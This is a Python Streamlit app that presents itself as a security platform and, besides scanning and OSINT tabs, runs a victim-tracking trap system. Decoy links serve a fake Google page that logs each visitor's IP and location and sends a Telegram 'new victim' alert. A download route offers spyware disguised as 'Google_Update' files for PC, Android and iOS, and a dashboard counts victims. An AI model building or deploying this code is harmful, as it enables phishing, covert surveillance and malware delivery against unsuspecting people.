import streamlit as st
import requests
import json
import os
from datetime import datetime
import victim_logger
import config
import base64
import uuid

# إعداد متغيرات البيئة
os.environ["TAVILY_API_KEY"] = config.get_key("TAVILY_API_KEY")
os.environ["GROQ_API_KEY"] = config.get_key("GROQ_API_KEY")
os.environ["GEMINI_API_KEY"] = config.get_key("GEMINI_API_KEY")

# استيراد الوحدات
try:
    import domain_osint
    import ai_pentest
    import port_scanner
    import network_mapper
    import google_dork
    import vuln_scanner
    import darkweb_search
    import ai_threat
    import email_osint
    import phone_osint
    import website_scan
    import username_osint
    import geoip_osint
    import attack_surface
    import ai_analysis
    import report_generator
    from ai_hacking import AIHackingAssistant
except ImportError as e:
    st.warning(f"بعض المكتبات مفقودة: {e}")

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")

# تصميم الواجهة الاحترافية (CSS)
st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button {
        width: 100%;
        border-radius: 5px;
        height: 3em;
        background-color: #262730;
        color: white;
        border: 1px solid #4b4b4b;
    }
    .stButton>button:hover { background-color: #ff4b4b; border: 1px solid #ff4b4b; }
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stApp [data-testid="stToolbar"] {display: none;}
    /* تحسين شكل التبويبات */
    .stTabs [data-baseweb="tab-list"] {
        gap: 10px;
    }
    .stTabs [data-baseweb="tab"] {
        height: 50px;
        white-space: pre-wrap;
        background-color: #1e293b;
        border-radius: 5px 5px 0px 0px;
        color: white;
    }
    .stTabs [aria-selected="true"] {
        background-color: #ff4b4b !important;
    }
    </style>
    """, unsafe_allow_html=True)

# دالة جلب الـ IP العام
def get_real_public_ip():
    try:
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            ip = headers["X-Forwarded-For"].split(",")[0].strip()
            if not ip.startswith(("10.", "172.", "192.168.")): return ip
        return requests.get("https://api.ipify.org", timeout=5).text
    except: return "Unknown"

# دالة إرسال التنبيه
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    if not token or not chat_id: return
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {"country": res.get("country"), "city": res.get("city"), "isp": res.get("isp")}
    except: pass
    msg = f"🎯 تنبيه: ضحية جديدة!\n📍 IP: {ip}\n🌍 {geo_data['country']} - {geo_data['city']}\n🏢 {geo_data['isp']}\n📱 {device}\n🎯 {trap_name}"
    try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg})
    except: pass
    victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)

# وضع التمويه
query_params = st.query_params
if "decoy" in query_params:
    ip = get_real_public_ip()
    if "alert_sent" not in st.session_state:
        send_telegram_alert(ip, query_params.get("trap", "Google Decoy"))
        st.session_state.alert_sent = True
    with open("index.html", "r", encoding="utf-8") as f: st.components.v1.html(f.read(), height=1000)
    st.stop()

# التحميل
if "download" in query_params:
    device = query_params.get("device", "pc")
    send_telegram_alert(get_real_public_ip(), f"Download ({device})", device)
    if device == "android": f, c, m = "Google_Update.apk", b"APK", "application/vnd.android.package-archive"
    elif device == "ios": f, c, m = "Google_Update.mobileconfig", b"Config", "application/x-apple-aspen-config"
    else: f, c, m = "Google_Update.py", open("spy_full.py", "rb").read() if os.path.exists("spy_full.py") else b"Py", "application/octet-stream"
    st.download_button("تحميل", c, file_name=f, mime=m)
    st.stop()

# تسجيل الدخول
if "authenticated" not in st.session_state: st.session_state.authenticated = False
if not st.session_state.authenticated:
    st.title("🛡️ Rashd_Ai Login")
    with st.form("login"):
        u, p = st.text_input("User"), st.text_input("Pass", type="password")
        if st.form_submit_button("Login"):
            if u == config.ADMIN_USERNAME and p == config.ADMIN_PASSWORD:
                st.session_state.authenticated = True
                st.rerun()
            else: st.error("Error")
    st.stop()

# القائمة الجانبية (Sidebar)
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/shield.png", width=80)
    st.title("🛡️ Rashd_Ai Pro")
    st.markdown("---")
    
    st.subheader("🔑 API Keys")
    groq_key = st.text_input("Groq API Key", value=config.get_key("GROQ_API_KEY"), type="password")
    gemini_key = st.text_input("Gemini API Key", value=config.get_key("GEMINI_API_KEY"), type="password")
    tavily_key = st.text_input("Tavily API Key", value=config.get_key("TAVILY_API_KEY"), type="password")
    tg_token = st.text_input("Telegram Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
    tg_chat = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
    
    if st.button("Save Keys"):
        config.set_key("GROQ_API_KEY", groq_key)
        config.set_key("GEMINI_API_KEY", gemini_key)
        config.set_key("TAVILY_API_KEY", tavily_key)
        config.set_key("TELEGRAM_BOT_TOKEN", tg_token)
        config.set_key("TELEGRAM_CHAT_ID", tg_chat)
        st.success("Keys Saved!")
        st.rerun()
        
    st.markdown("---")
    if st.button("Logout"):
        st.session_state.authenticated = False
        st.rerun()

# الواجهة الرئيسية باستخدام التبويبات (Tabs)
st.header("🛡️ Rashd_Ai Security Platform")

tabs = st.tabs([
    "📊 Dashboard", 
    "🔍 OSINT", 
    "🛡️ Security", 
    "🧠 AI Tools", 
    "🎯 Traps", 
    "⚙️ Settings"
])

# 1. Dashboard
with tabs[0]:
    victims = victim_logger.get_all_victims()
    c1, c2, c3 = st.columns(3)
    c1.metric("Victims", len(victims))
    c2.metric("Tools", "18")
    c3.metric("Status", "Online ✅")
    
    st.subheader("💬 Rashd_Ai Assistant")
    if "messages" not in st.session_state: st.session_state.messages = []
    
    # حاوية ثابتة الارتفاع للمحادثة
    with st.container(height=400):
        for msg in st.session_state.messages:
            with st.chat_message(msg["role"]):
                st.markdown(msg["content"])
    
    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"): st.markdown(prompt)
        with st.chat_message("assistant"):
            try:
                # محاولة الاتصال بالذكاء الاصطناعي مع معالجة الخطأ
                assistant = AIHackingAssistant()
                response = assistant.chat(prompt)
            except Exception as e:
                response = f"❌ خطأ في الاتصال بالذكاء الاصطناعي: {str(e)}"
            st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})
        st.rerun()

    st.subheader("🎯 Recent Victims")
    if victims: st.table(victims[:5])

# 2. OSINT
with tabs[1]:
    st.header("🔍 OSINT Tools")
    o_tabs = st.tabs(["🌐 Domain", "👤 User", "📧 Email", "📱 Phone"])
    with o_tabs[0]:
        d = st.text_input("Domain")
        if st.button("Scan Domain"):
            try: st.write(domain_osint.whois_lookup(d))
            except: st.error("Error")
    with o_tabs[1]:
        u = st.text_input("User")
        if st.button("Search User"):
            try: st.write(username_osint.username_search(u))
            except: st.error("Error")
    with o_tabs[2]:
        e = st.text_input("Email")
        if st.button("Search Email"):
            try: st.write(email_osint.search_email(e))
            except: st.error("Error")
    with o_tabs[3]:
        p = st.text_input("Phone")
        if st.button("Lookup Phone"):
            try: st.write(phone_osint.lookup(p))
            except: st.error("Error")

# 3. Security
with tabs[2]:
    st.header("🛡️ Security Tools")
    s_tabs = st.tabs(["🔍 Web", "🔌 Ports", "⚠️ Vulns"])
    with s_tabs[0]:
        u = st.text_input("URL")
        if st.button("Scan Web"):
            try: st.write(website_scan.detect_tech(u))
            except: st.error("Error")
    with s_tabs[1]:
        i = st.text_input("IP")
        if st.button("Scan Ports"):
            try: st.write(port_scanner.scan(i))
            except: st.error("Error")
    with s_tabs[2]:
        i = st.text_input("Target")
        if st.button("Scan Vulns"):
            try: st.write(vuln_scanner.scan(i))
            except: st.error("Error")

# 4. AI Tools
with tabs[3]:
    st.header("🧠 AI Security")
    data = st.text_area("Data")
    if st.button("Analyze"):
        try: st.write(ai_analysis.analyze_data(data))
        except: st.error("Error")

# 5. Traps
with tabs[4]:
    st.header("🎯 Traps")
    tid = st.text_input("Trap ID", value="Google_Trap")
    st.code(f"https://rashdai.streamlit.app/?decoy=google&trap={tid}")
    if st.button("Refresh"): st.table(victim_logger.get_all_victims())

# 6. Settings
with tabs[5]:
    st.header("⚙️ Settings")
    st.success("API Keys Active.")
    st.info("Version: 3.2.0 (Tabs & Sidebar Keys Edition)")
